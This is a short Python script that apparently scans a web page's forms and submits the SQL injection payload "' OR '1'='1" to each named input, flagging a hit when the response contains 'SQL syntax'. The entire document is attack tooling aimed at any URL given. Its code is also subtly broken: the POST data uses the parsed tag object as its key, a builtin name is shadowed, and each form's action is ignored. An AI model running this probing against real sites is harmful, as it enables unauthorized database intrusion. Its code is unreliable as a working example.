import requests
from bs4 import BeautifulSoup

def findInjectionBasic(link):
    
    url = link

    r = requests.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')

    forms = soup.find_all('form')

    for form in forms:

        inputs = form.find_all('input')
        for input in inputs:

            if 'name' in input.attrs:
                input_name = input['name']
                payload = "' OR '1'='1"
                data = {input: payload}
                r = requests.post(url, data=data)

                if "SQL syntax" in r.text:
                    print("SQL injection found in:", input_name)
                else:
                    print("Injection not found in:", input_name)